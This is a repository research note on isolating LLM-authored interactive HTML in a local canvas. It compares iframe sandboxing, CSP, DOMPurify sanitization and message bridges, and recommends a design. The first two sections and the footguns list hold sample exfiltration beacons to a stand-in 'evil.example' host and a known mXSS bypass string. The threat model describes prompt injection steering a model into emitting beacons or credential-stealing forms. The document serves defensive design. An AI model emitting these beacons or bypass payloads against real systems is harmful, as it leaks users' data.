# Safely rendering untrusted, LLM-authored, interactive HTML in a local browser surface

**Research date:** 2026-07-14. All claims checked against primary sources (WHATWG/W3C specs, MDN, vendor docs, tool source/wikis) on that date; anything I could not verify against a primary source is flagged as such inline.
**Location note:** follows the `docs/research/` convention established by `local-canvas-landscape.md`.
**Status:** this file INFORMS a decision — it feeds the wayfinder ticket on the free-form-HTML architectural slot left by [ADR 0002](../adr/0002-no-freeform-html-in-v1.md). It does not make the decision. Open questions for the decision-maker are collected at the end.

**Repo state observed while writing** (2026-07-14 18:30 MDT, branch `main`, HEAD `415731f`; other sessions were working in parallel, so this is a snapshot): the Canvas Server is an MCP stdio + capability-token-authed 127.0.0.1 HTTP server (`src/server/http.ts` already sets a CSP header on every response); the Canvas is a Vite-built SPA in a plain browser tab; v1 artifacts are Component Artifacts rendered by trusted code (`src/canvas/components/document.ts` builds DOM via `textContent`, never `innerHTML` of model strings) plus free-form SVG under Image Isolation; `src/sanitizer/` is an empty placeholder. That architecture is exactly the "recommended default" this research converges on — the open decision is the escape hatch.

---

## Threat model recap

The HTML/CSS/JS under consideration is authored by an LLM, and model output must be treated as hostile-authorable. Prompt injection in anything the model read — a README, a web page, tool output — can steer it into emitting an exfiltration beacon, a credential-stealing form, or a payload probing the renderer for a sandbox escape. The author of the artifact is not the user; it is whoever last wrote text the model trusted.

The renderer is a local service running as the user, so the ambient context is unusually sensitive: the user's files, the agent's transport and capability token, other localhost services (dev servers, databases, the Canvas Server's own ask-back write channel), and cloud/`gh` credentials on PATH. A malicious artifact must not be able to script against the host page, read or replay the capability token, reach localhost services, or carry data it was given out to the network.

Safety here is a spectrum, not a bit. At one end is safe-by-construction output (structured data rendered by trusted components; markup shown only as a raster/SVG image) where script execution is impossible rather than filtered out. At the other end is fully interactive HTML, where every added capability (script, forms, popups, network) is a channel that must be individually closed or consciously accepted. The sections below establish what each rung actually guarantees, per the specs, and what it leaks.

---

## 1. Iframe sandboxing (WHATWG HTML)

The [`sandbox` attribute](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox) applies all restrictions when present and empty; each token lifts one restriction. Tokens relevant here, per the [HTML spec](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox) and [MDN's iframe reference](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe):

| Token | Lifts |
| --- | --- |
| `allow-scripts` | script execution (does not re-enable popups) |
| `allow-same-origin` | the forced opaque origin — content is treated as its real origin again |
| `allow-forms` | form submission (without it, forms render but submission silently fails) |
| `allow-popups` | `window.open()` / `target="_blank"` (without it, they silently fail) |
| `allow-popups-to-escape-sandbox` | new windows opened from the frame are NOT forced into the sandbox |
| `allow-modals` | `alert/confirm/prompt/print`, `<dialog>` |
| `allow-top-navigation` / `-by-user-activation` / `-to-custom-protocols` | navigating the top-level page (always / only on user gesture / to non-fetch schemes) |
| `allow-downloads` | downloads via `download` attribute or navigation |
| `allow-pointer-lock`, `allow-orientation-lock`, `allow-presentation`, `allow-storage-access-by-user-activation` | the named APIs |

**The escape footgun, verbatim from the spec** ([HTML, iframe sandbox](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox)): *"Setting both the `allow-scripts` and `allow-same-origin` keywords together when the embedded page has the same origin as the page containing the `iframe` allows the embedded page to simply remove the `sandbox` attribute and then reload itself, effectively breaking out of the sandbox altogether."* [MDN repeats it](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe): using both makes the frame *"no more secure than not using the `sandbox` attribute at all."* For a local renderer where frame content would otherwise be same-origin with the host page, `allow-same-origin` is simply never grantable.

**What omitting `allow-same-origin` (opaque origin) actually buys.** The [sandboxed origin browsing context flag](https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-origin-browsing-context-flag) *"forces content into an opaque origin, thus preventing it from accessing other content from the same origin"* — no cookies (`document.cookie` throws), no `localStorage`, no same-origin DOM access to the host, no reading other 127.0.0.1 content under the same-origin policy. The opaque origin [serializes to the string `"null"`](https://html.spec.whatwg.org/multipage/browsers.html#ascii-serialisation-of-an-origin) (*"If origin is an opaque origin, then return 'null'"*), which matters for `postMessage` and `Origin` headers.

**What it does NOT buy — the key exfil point.** An opaque origin does not disable networking. `fetch()`/XHR from the frame still issue requests; CORS only gates whether the *response is readable*, not whether the request is *sent*. In [`no-cors` mode](https://developer.mozilla.org/en-US/docs/Web/API/Request/mode) the request goes out and the response is opaque — a perfect one-way beacon. `<img src="https://evil.example/?d=...">` is likewise an ordinary image fetch. Only CSP (`connect-src`, `img-src`, etc., §2) closes these.

**What survives inside the sandbox (interactivity).** With `allow-scripts` alone: full DOM scripting of the frame's own document, canvas/WebGL, timers, `postMessage` to the parent, CSS, selection. Add `allow-forms` for form UX, `allow-modals` for dialogs. Nothing about the sandbox itself prevents rich interactivity — the containment work is done by the origin flag plus CSP.

**Navigation is the hole the sandbox leaves open.** The [sandboxed navigation browsing context flag](https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-navigation-browsing-context-flag) *"prevents content from navigating browsing contexts other than the sandboxed browsing context itself"* — i.e., a sandboxed document **can always navigate itself**. `location = "https://evil.example/?d=" + secret` (or a plain `<a href>` click, or form GET if forms are allowed) sends the data out as a navigation request, which no sandbox token forbids and which CSP can no longer forbid either (`navigate-to` is dead, §2). The [sandboxed automatic features flag](https://html.spec.whatwg.org/multipage/browsers.html#sandboxed-automatic-features-browsing-context-flag) *"blocks features that trigger automatically, such as automatically playing a video or automatically focusing a form control"* — the spec text does not name `<meta http-equiv=refresh>`, and I could not verify against a primary source whether meta refresh is blocked in a sandboxed frame; treat scripted self-navigation as the confirmed-open channel.

**`srcdoc` vs `src`.** `srcdoc` content parses as `about:srcdoc`; with `sandbox` set it gets an opaque origin like anything else, and [relative URLs resolve against the embedding page's URL](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe) (an easy way to accidentally point at host resources). `data:` and `blob:` URLs in `src` also yield opaque/derived origins, but `srcdoc` and a separate-origin `src` are the two patterns that let the host inject a wrapper (base CSP, bridge script) around model content. MDN adds a deployment warning worth keeping: *"Sandboxing is useless if the attacker can display content outside a sandboxed `<iframe>`"* — e.g., the viewer opening the frame URL in a full tab — so frame content *"should also be served from a separate origin"* even when sandboxed ([MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)).

## 2. CSP as the containment layer

Baseline: [`default-src 'none'`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy) — `default-src` is the fallback for every fetch directive, so `'none'` blocks all resource loads, then individual directives re-open exactly what rendering needs (`img-src data: blob:`, `style-src 'unsafe-inline'`, `script-src 'unsafe-inline'` inside the frame — a nonce/hash adds nothing when the *entire document* is attacker-authored; the meaningful control is which *hosts* code can load from, and that stays `'none'`-equivalent).

**Killing exfil:** [`connect-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/connect-src) governs, per MDN's enumerated list: `<a ping>`, `fetch()`, `fetchLater()`, `XMLHttpRequest`, `WebSocket`, `EventSource`, and `Navigator.sendBeacon()`. `connect-src 'none'` closes all of them. Subresource beacons (`<img>`, fonts, media, CSS `url()`) are closed by their own directives under `default-src 'none'`. [`form-action 'none'`](https://w3c.github.io/webappsec-csp/#directive-form-action) blocks form submission to anywhere (a navigation-class exfil channel CSP *can* still close). One MDN caveat: *"`connect-src 'self'` does not resolve to websocket schemes in all browsers"* ([MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/connect-src)) — irrelevant if the value is `'none'`, which it should be.

**What a maximally-locked CSP does NOT close:**

- **Self-navigation.** The `navigate-to` directive was [removed from the CSP3 spec in September 2022 and never shipped in any browser](https://github.com/w3c/webappsec-csp/issues/608) (see also [mdn/content#21114](https://github.com/mdn/content/issues/21114)). There is today no CSP directive that constrains where a document may navigate itself. Combined with §1, scripted `location` assignment and user-clicked `<a href>` remain open exfil channels in any script-enabled frame.
- **Popups/top-navigation** are sandbox's job, not CSP's — omit `allow-popups` and `allow-top-navigation*` and both [silently fail](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe).
- **Prefetch edge:** CSP3 notes resources fetched via `Link` headers or elements *preceding a meta-delivered policy* are not blocked ([CSP3 §meta](https://w3c.github.io/webappsec-csp/#meta-element)) — an argument for header delivery. (`prefetch-src` exists in MDN's directive list but is deprecated/unimplemented; don't rely on it.)
- **DNS-level tricks:** claims that CSP leaks via DNS prefetch of blocked hosts circulate in blogs; I did not find a primary-source guarantee either way, so treat DNS prefetch behavior as unverified rather than closed. `<meta name="referrer">`/`Referrer-Policy` and simply *not giving the frame secrets* are the robust mitigations.

**Delivery.** The CSP3 spec is explicit about `<meta http-equiv="Content-Security-Policy">` limits: report-only *"is not supported inside a meta element. Neither are the `report-uri`, `frame-ancestors`, and `sandbox` directives"* ([CSP3](https://w3c.github.io/webappsec-csp/#meta-element)), and meta policies don't apply to content preceding them. The [`sandbox` CSP directive](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy) (*"enables a sandbox for the requested resource similar to the iframe sandbox attribute"*) therefore only works via HTTP header — which this repo's Canvas Server can send, since it already sets CSP headers on every response (`src/server/http.ts`). Header delivery from a real server is strictly stronger than a meta tag inside `srcdoc`: it covers pre-parse fetches, supports `sandbox` and `frame-ancestors`, and can't be affected by document content. `frame-ancestors` on the frame response should pin embedding to the Canvas origin so the artifact URL is not usefully embeddable elsewhere.

## 3. HTML sanitization

**DOMPurify** ([cure53/DOMPurify](https://github.com/cure53/DOMPurify), v3.4.12 as of July 2026, actively maintained) is the reference allowlist sanitizer: *"a DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG."* Its [Security Goals & Threat Model](https://github.com/cure53/DOMPurify/wiki/Security-Goals-&-Threat-Model) is unusually honest about scope. In scope: XSS, mXSS (namespace checks + attribute-value guards), DOM clobbering, prototype-pollution resilience. Explicitly OUT of scope, quoting the wiki: it *"will NOT protect you against feeding HTML-sanitized output into a different markup context"*; it *"is not a CSS sanitizer"*; it *"will NOT reliably stop HTML that requests external resources"* (i.e., **sanitized output can still beacon via `<img>` — sanitization alone does not close exfil**); and it *"will NOT save you from client-side frameworks that re-enable script execution from otherwise-inert attributes"* (script gadgets). Post-processing sanitized output voids the guarantee.

**mXSS is a living bypass class, not history.** The wiki's [Attack Classes & Bypass History](https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History) catalogs ~21 recurring classes and concrete bypasses: Michał Bentkowski's namespace-confusion mXSS fixed in 2.0.17 (`<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>` — markup that mutates between namespaces on reparse); CVE-2026-0540 (rawtext closers like `</noscript>` hidden in attribute values); CVE-2026-41238 (prototype pollution downgrading the config, 3.0.1–3.3.3); CVE-2026-47423 (Chrome re-cloning `<selectedcontent>` *after* sanitization, resurrecting removed nodes). The wiki's own summary: *"Most sanitizer bypasses are not 'forgot to remove `<script>`'. They happen at boundaries."* A sanitizer is a parser-differential arms race even when written by the best team in the field.

**The native Sanitizer API** (`Element.setHTML()`, `Sanitizer`) has moved from WICG into the [WHATWG HTML spec](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API); safe methods *"always remove XSS-unsafe elements and attributes"* even under custom configs. Shipping status as of mid-2026: MDN marks it **"Limited availability… not Baseline because it does not work in some of the most widely-used browsers."** Firefox shipped it in Firefox 148 (Feb 2026) with Chromium following (Chrome 146); Safari has not shipped — the version specifics come from secondary coverage ([e.g.](https://lilting.ch/en/articles/sethtml-xss-protection-firefox-148)), the not-Baseline status from [MDN](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API). Not something a 2026 local tool can require.

**Where sanitization sits on the spectrum:** adequate for displaying *static markup* (rendered Markdown, rich-text snippets) inside the host DOM — which is what Jupyter uses it for (§5) — provided CSP on the host page separately closes the resource-fetch exfil DOMPurify disclaims. It is categorically insufficient the moment artifacts need scripts: an allowlist that admits `<script>` is not a sanitizer, and one that strips it removes the interactivity that motivated the escape hatch. Sanitize-then-execute is not a rung on this ladder.

## 4. The messaging boundary (postMessage / MessageChannel)

With no `allow-same-origin`, the frame's origin is opaque and serializes as `"null"` (§1). Consequences, per [MDN's postMessage security notes](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage):

- **Host → frame:** a specific `targetOrigin` cannot match an opaque origin, so the host must post with `"*"` — MDN documents this explicitly for opaque-origin targets (*"Because `data:` URLs have opaque origins… you must specify `"*"`"*). MDN's general warning still applies: *"Always specify an exact target origin, not `*`… A malicious site can change the location of the window without your knowledge."* Mitigation: send nothing sensitive in broadcast messages, and prefer **port transfer** — create a [`MessageChannel`](https://developer.mozilla.org/en-US/docs/Web/API/Channel_Messaging_API), post `port2` to the frame in one bootstrap message (transferable via `MessageEvent.ports`, per [MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)), and do all subsequent traffic over the port pair. Ports are point-to-point: a navigated-away or spoofed window can't join an already-entangled channel.
- **Frame → host:** `event.origin` will be `"null"`, so origin checks are useless for authenticating the frame; the host must check **`event.source === iframe.contentWindow`** (or better, only listen on its retained `port1`). MDN: *"If you do not expect to receive messages… do not add any event listeners"*; having verified identity, *"you still should always verify the syntax of the received message"* — schema-validate every payload, never `eval`/`new Function`/`innerHTML` anything from it.
- **Capability-scoped surface:** the host should expose a small closed verb set (this repo's ask-back verbs, sizing, theme) and treat everything else as a protocol violation. This is exactly VS Code's `acquireVsCodeApi()`/`postMessage` shape (§5) and MCP Apps' consent-gated JSON-RPC bridge. The frame must never see the capability token; message handling is the *only* door, mirroring [ADR 0010](../adr/0010-askback-is-the-only-door.md).

## 5. Prior art — what real tools trust, isolate, and forbid

- **VS Code webviews** (closest analog: extension-authored HTML inside a local, user-privileged app). Docs: *"Think of a webview as an iframe within VS Code that your extension controls."* Isolation: iframe on a separate origin — a per-webview `vscode-webview://<uuid>` origin with a service worker mediating local resource loads ([issue #132464](https://github.com/microsoft/vscode/issues/132464), [webview service worker source](https://github.com/microsoft/vscode/blob/7666d7acd4cb7382c6e4749166f713d1226ccd99/src/vs/workbench/contrib/webview/browser/pre/service-worker.js)); no Node/VS Code API access; filesystem reach fenced by `localResourceRoots` + `asWebviewUri`. Enforced-by-guidance CSP starting at `default-src 'none'`; *"a webview should have the minimum set of capabilities that it needs"*; *"never rely on sanitization alone"* ([webview guide](https://code.visualstudio.com/api/extension-guides/webview)). Trusts: the extension host. Isolates: all webview DOM/JS. Forbids: ambient authority; everything flows through `postMessage`.
- **Claude Code artifacts / claude.ai.** Officially documented: pages are served *"under a strict Content Security Policy"* that *"blocks scripts, stylesheets, fonts, and images loaded from any other host, along with `fetch`, XHR, and WebSocket calls"*, and the viewer *"loads each artifact from a sandboxed `*.claudeusercontent.com` origin"* ([code.claude.com artifacts docs](https://code.claude.com/docs/en/artifacts)). Trusts: nothing in the page — content is self-contained, no backend, no external requests. This is a production answer to *exactly* this threat model: interactive JS allowed, network forbidden, separate registrable domain as the outer wall.
- **ChatGPT apps/canvas.** OpenAI documents sandboxed-iframe + strict-CSP rendering for Apps SDK widgets, with privileged APIs (`window.alert`, `navigator.clipboard`, …) blocked and network reachable only through per-app CSP allowlists (`_meta.ui.csp`); serving is from a `web-sandbox.oaiusercontent.com` sandbox origin ([Apps SDK security & privacy](https://developers.openai.com/apps-sdk/guides/security-privacy)). The double-iframe/bridge details come from reverse-engineering write-ups ([observed, not vendor-documented](https://dev.to/infoxicator/i-reverse-engineered-chatgpt-apps-iframe-sandbox-2ok3)). Notable: OpenAI *grants* scoped network as a first-class, consented capability — the main divergence from Anthropic's flat "no external requests."
- **Jupyter.** A signature-based trust model: *"a signature is computed from a digest of the notebook's contents plus a secret key"*; *"untrusted HTML is always sanitized"* and *"untrusted JavaScript is never executed"*; outputs you generated yourself are trusted ([Jupyter security docs](https://jupyter-server.readthedocs.io/en/latest/operators/security.html)). The docs still name [Google Caja](https://developers.google.com/caja) for Markdown sanitization; JupyterLab's `@jupyterlab/apputils` ships its own `Sanitizer` class ([API docs](https://jupyterlab.readthedocs.io/en/3.2.x/api/classes/apputils.sanitizer.html)) — I could not verify from a primary source that it is DOMPurify specifically, so I won't claim it. Trusts: the user's own execution. Isolates: nothing (same DOM!) — which is why it must *forbid* scripts entirely for untrusted content. Sanitize-into-host-DOM forces the no-scripts rung.
- **Observable.** *"The sandbox is implemented as a sandboxed iframe running on a per-user domain (under observableusercontent.com, not observablehq.com)"* — a unique subdomain per user so storage/cookies can't cross notebooks, editor (privileged) strictly separated from sandbox (renders output only), and *"dynamic requests for arbitrary sensitive data are denied"* with secrets only injectable via static analysis + short-lived tokens ([Observable security model](https://observablehq.com/documentation/security/data-security-and-privacy); the no-`allow-same-origin` reasoning is spelled out by the founders on [their forum](https://talk.observablehq.com/t/iframe-sandbox-attribute/193/2)). Full-power JS allowed; ambient authority forbidden.
- **Streamlit components:** *"each Streamlit Component is its own webpage that gets rendered into an iframe"*, communicating via `Streamlit.setComponentValue()` ([docs](https://docs.streamlit.io/develop/concepts/custom-components/intro)). Iframe isolation for composition; the docs don't document a hardened sandbox/origin story — components are developer-trusted, not attacker-modeled. Included as contrast: iframe ≠ security boundary unless origin + sandbox + CSP make it one.

**The convergent pattern:** every tool that renders attacker-modeled scriptable content uses **iframe + no ambient origin (opaque or dedicated usercontent domain) + CSP + a narrow message bridge**. Every tool that renders into its own DOM (Jupyter) forbids scripts and sanitizes. No serious tool sanitizes-and-executes in the host context.

## 6. The safe-by-construction floor

Rendering model output as an **image** — raster or SVG via `<img src="data:image/svg+xml,...">` — makes script execution impossible by construction: when SVG is used as an image, *"JavaScript is disabled"* and *"external resources (e.g., images, stylesheets) cannot be loaded"* ([MDN, SVG as an image](https://developer.mozilla.org/en-US/docs/Web/SVG/Guides/SVG_as_an_image)); the no-external-loads rule also closes exfil-by-subresource. This is the repo's existing **Image Isolation** posture for free-form SVG (ADR 0002), and the research confirms it is the strongest rung: nothing to sanitize, no parser arms race, no message boundary. The cost is real: no text selection, no live-region accessibility tree (alt text only), no links, no forms, no incremental updates without re-rendering the whole image, and raster blurs on zoom (SVG-as-image at least scales crisply).

The **structured-data-only** alternative — the model emits JSON; the host renders it with its own trusted components — keeps interactivity while never executing model-authored code: interactivity lives in trusted component code, and model strings land via `textContent`. This is the "never render model markup" school, it is Jupyter's lesson inverted (instead of sanitizing markup, never accept markup), and it is what this repo already ships (`src/canvas/components/document.ts`). Its ceiling is the vocabulary: expressiveness is bounded by what the component set can draw, and every new capability is host code to write and review.

---

## Comparison matrix

| Strategy | Safety ceiling | Expressiveness | Interactivity | Impl. cost |
| --- | --- | --- | --- | --- |
| **Static-image isolation** (data:-URL `<img>`, SVG/raster) | ●●●●● impossible-by-construction | ●●●○○ anything drawable, frozen | ●○○○○ none (zoom/pan by host at best) | ●○○○○ trivial (already shipped here) |
| **Structured-data-only** (JSON → trusted components) | ●●●●● no model code ever executes | ●●●○○ bounded by vocabulary | ●●●●○ whatever trusted components implement | ●●●○○ per-component, ongoing (already shipped here) |
| **Sanitized-inline** (DOMPurify into host DOM) | ●●○○○ filter, not boundary; mXSS arms race; host-context blast radius | ●●●●○ arbitrary static markup | ●●○○○ CSS-only; scripts are forbidden by definition | ●●○○○ library + strict host CSP + update discipline |
| **Sandboxed iframe + CSP** (opaque origin, header CSP, port bridge) | ●●●●○ browser-enforced boundary; residual navigation channel + engine-bug risk | ●●●●● full HTML/CSS/JS | ●●●●● full, incl. scripts and live updates over the bridge | ●●●●○ frame route, CSP, bridge protocol, message schema, review |

### Known footguns per strategy

**Static-image isolation**
- Restrictions apply only in *image* contexts: the same SVG opened directly, or in `<iframe>`/`<object>`/`<embed>`, runs scripts ([MDN](https://developer.mozilla.org/en-US/docs/Web/SVG/Guides/SVG_as_an_image)) — never offer a "open raw" affordance on the artifact bytes.
- SVG served inline into the host DOM (not via `<img>`) is live markup — `<svg onload>` executes. The `<img>`/data:-URL path is load-bearing, not cosmetic.
- Accessibility and selection loss is a product cost that pushes users to ask for riskier rungs.

**Structured-data-only**
- Component code that takes a model string into `innerHTML`, a URL attribute (`href`, `src`), or a CSS value reintroduces injection — the discipline is per-component and forever (this repo's `textContent`-only rule is the right invariant).
- URL-bearing fields (links in docs) need protocol allowlists (`https:`? `javascript:` never) — a vocabulary-level decision.
- Vocabulary creep: each "just one more component" expands the trusted computing base without a visible ratchet.

**Sanitized-inline (DOMPurify)**
- mXSS bypasses recur against the best-maintained sanitizer in existence (§3: 2.0.17, CVE-2026-0540, CVE-2026-41238, CVE-2026-47423) — and a bypass here executes *in the Canvas origin*, i.e., token-adjacent. Worst-case blast radius is the whole threat model.
- DOMPurify explicitly does not stop resource-fetch exfil (*"will NOT reliably stop HTML that requests external resources"*) — the host page's own CSP must do it, which constrains the Canvas's own connectivity (it needs its SSE stream).
- Framework script gadgets and post-sanitize DOM manipulation void the guarantee ([threat model wiki](https://github.com/cure53/DOMPurify/wiki/Security-Goals-&-Threat-Model)).
- The native Sanitizer API is not Baseline in mid-2026 (§3); it can't replace the dependency yet.

**Sandboxed iframe + CSP**
- `allow-same-origin` + `allow-scripts` = the documented sandbox escape ([HTML spec](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox)); linters won't save you — make it structurally impossible (constant, not config).
- Absent CSP, an opaque-origin frame can still `fetch()`/beacon to the open web (§1) — sandbox without `connect-src 'none'`-class CSP is not containment.
- Meta-delivered CSP silently drops `sandbox`, `frame-ancestors`, `report-uri` and doesn't cover earlier content ([CSP3](https://w3c.github.io/webappsec-csp/#meta-element)) — deliver by header.
- Self-navigation exfil (`location = evil?data`, link clicks) has no sandbox token and no CSP directive since `navigate-to`'s removal ([w3c/webappsec-csp#608](https://github.com/w3c/webappsec-csp/issues/608)) — must be accepted, data-starved, or intercepted outside the web platform (Electron `will-navigate`; not possible from a parent page in a plain tab).
- `targetOrigin` must be `"*"` toward an opaque origin; `event.origin` is `"null"` from it — identity comes from `event.source`/port possession, nothing else (§4).
- The frame is same-*machine* even when cross-origin: never mint frame URLs bearing the capability token; keep token injection scoped away from artifact routes (the repo already scopes token injection to built `/assets/` — commit `9b32fde`).
- Renderer/engine bugs: the boundary is the browser's process/origin model; a Chromium sandbox-escape 0-day beats it. That's the same bet VS Code, Observable, and Anthropic make; it is a reasonable bet, not a proof.

---

## Recommendation: default + escape hatch

**Default (unchanged, now evidence-backed): structured components + SVG Image Isolation.** The research validates ADR 0002 rather than revising it — the two safe-by-construction rungs this repo already ships are the top of the safety column, and every serious prior-art tool treats "model markup executing anywhere" as the thing to avoid until forced. `src/sanitizer/` should stay empty: sanitize-into-host-DOM is the *weakest* of the four strategies for this threat model (filter not boundary, host-origin blast radius) and prior art uses it only where scripts are already forbidden. If static rich-markup display is ever wanted, prefer widening the component vocabulary over admitting markup.

**Escape hatch (the labeled slot, if the pilot gallery proves need): sandboxed iframe + header CSP + port bridge — never sanitized inline HTML.** Concretely:

- **Serve, don't `srcdoc`.** Serve artifact HTML from the Canvas Server on a **second 127.0.0.1 port** (a different port is a different origin), token-free routes, artifact bytes wrapped in a host-controlled document shell. This enables header CSP (incl. `sandbox` and `frame-ancestors`, impossible via meta), keeps the frame cross-origin from the Canvas even if a sandbox token is ever misconfigured (defense in depth per MDN's "separate origin" note), and makes "opened in a full tab" still-contained.
- **Iframe attribute** (host side, a frozen constant):
  `sandbox="allow-scripts allow-forms allow-modals"`
  — nothing else. Explicitly never: `allow-same-origin`, `allow-popups`, `allow-popups-to-escape-sandbox`, `allow-top-navigation*`, `allow-downloads`.
- **CSP header on every frame-route response** (mirror `sandbox` in the header as belt-and-braces):

  ```
  Content-Security-Policy: default-src 'none';
    script-src 'unsafe-inline'; style-src 'unsafe-inline';
    img-src data: blob:; font-src data:; media-src data: blob:;
    connect-src 'none'; form-action 'none'; base-uri 'none';
    frame-ancestors http://127.0.0.1:<canvas-port>;
    sandbox allow-scripts allow-forms allow-modals
  ```

  (`'unsafe-inline'` is deliberate: the document is wholly untrusted, so nonces add nothing; the guarantee comes from every *-src* refusing external hosts. Live updates flow host→frame over the bridge, never via frame-side fetch — `connect-src` stays `'none'`.)
- **Bridge protocol:** host bootstraps one `postMessage(initMsg, "*", [port2])` carrying a fresh `MessageChannel` port; all subsequent traffic on the port pair. Host rules: accept the bootstrap reply only when `event.source === iframe.contentWindow`; drop any window-level message after bootstrap; schema-validate every payload (closed verb set: ask-back verbs, `resize`, `theme`; reject unknown verbs, cap sizes, strings only — no structured objects passed to any interpreter); never `eval`/`Function`/`innerHTML` message content; the capability token never crosses the bridge in either direction. Ask-backs from frame artifacts enter the same queue as everything else (ADR 0010) with provenance marked `freeform-html`.
- **Accepted residual risk to record in the ADR:** self-navigation exfil on script or click (§1/§2). Palliatives: keep artifacts data-starved by default (the frame only ever holds what the agent chose to publish into it — already true here), and consider a click-shield/confirmation UX on frame navigation; a plain browser tab cannot block it outright.

### Open questions for the decision-maker

1. **Is network ever grantable?** Anthropic's artifacts say flat no; OpenAI's Apps SDK says yes via consented per-app CSP allowlists. If "dashboard fetches live data" demand appears, is the answer a host-side data proxy over the bridge (recommended — keeps `connect-src 'none'`) or a per-artifact consent grant?
2. **Second port vs same-port path.** Same-port serving would make frame routes same-origin with the Canvas — rejected above on defense-in-depth grounds, but the second listener has real costs (lifecycle, firewall prompts on macOS, capability-URL story for the frame route). Does the frame route need its own capability token (leak-on-navigation risk in `Referer`/history) or is unguessable-artifact-ID enough given token-free frame routes carry only content the user published?
3. **Plain tab vs wrapper.** Staying a plain browser tab means the navigation-exfil residual is permanent. An Electron/webview wrapper could intercept `will-navigate`, but contradicts ADR 0001's companion-canvas posture. Is the residual acceptable?
4. **Meta-refresh in sandbox** is unverified (§1) — if the hatch is built, test it empirically and strip `<meta http-equiv=refresh>` in the shell regardless.
5. **Ratchet for the vocabulary.** Structured components remain the default; who reviews vocabulary additions so the trusted computing base doesn't grow silently (the URL-allowlist question in the footguns list needs an owner)?

---

## Sources

**Specs**
- WHATWG HTML — iframe `sandbox`: https://html.spec.whatwg.org/multipage/iframe-embed-object.html
- WHATWG HTML — origins & sandboxing flags: https://html.spec.whatwg.org/multipage/browsers.html
- W3C CSP Level 3: https://w3c.github.io/webappsec-csp/
- `navigate-to` removal: https://github.com/w3c/webappsec-csp/issues/608, https://github.com/mdn/content/issues/21114

**MDN**
- `<iframe>`: https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe
- CSP guide: https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP
- `Content-Security-Policy` header: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy
- `connect-src`: https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/connect-src
- `Request.mode` (no-cors): https://developer.mozilla.org/en-US/docs/Web/API/Request/mode
- `Window.postMessage`: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
- Channel Messaging API: https://developer.mozilla.org/en-US/docs/Web/API/Channel_Messaging_API
- HTML Sanitizer API: https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API
- SVG as an image: https://developer.mozilla.org/en-US/docs/Web/SVG/Guides/SVG_as_an_image

**Sanitizers**
- DOMPurify: https://github.com/cure53/DOMPurify
- DOMPurify Security Goals & Threat Model: https://github.com/cure53/DOMPurify/wiki/Security-Goals-&-Threat-Model
- DOMPurify Attack Classes & Bypass History: https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
- Sanitizer API shipping (secondary): https://lilting.ch/en/articles/sethtml-xss-protection-firefox-148

**Prior art**
- VS Code webview guide: https://code.visualstudio.com/api/extension-guides/webview
- VS Code webview origin/service-worker: https://github.com/microsoft/vscode/issues/132464, https://github.com/microsoft/vscode/blob/7666d7acd4cb7382c6e4749166f713d1226ccd99/src/vs/workbench/contrib/webview/browser/pre/service-worker.js
- Claude Code artifacts: https://code.claude.com/docs/en/artifacts
- OpenAI Apps SDK security & privacy: https://developers.openai.com/apps-sdk/guides/security-privacy
- ChatGPT sandbox internals (observed/secondary): https://dev.to/infoxicator/i-reverse-engineered-chatgpt-apps-iframe-sandbox-2ok3
- Jupyter security model: https://jupyter-server.readthedocs.io/en/latest/operators/security.html
- JupyterLab sanitizer class: https://jupyterlab.readthedocs.io/en/3.2.x/api/classes/apputils.sanitizer.html
- Observable security model: https://observablehq.com/documentation/security/data-security-and-privacy
- Observable sandbox rationale (forum, founders): https://talk.observablehq.com/t/iframe-sandbox-attribute/193/2
- Streamlit components: https://docs.streamlit.io/develop/concepts/custom-components/intro
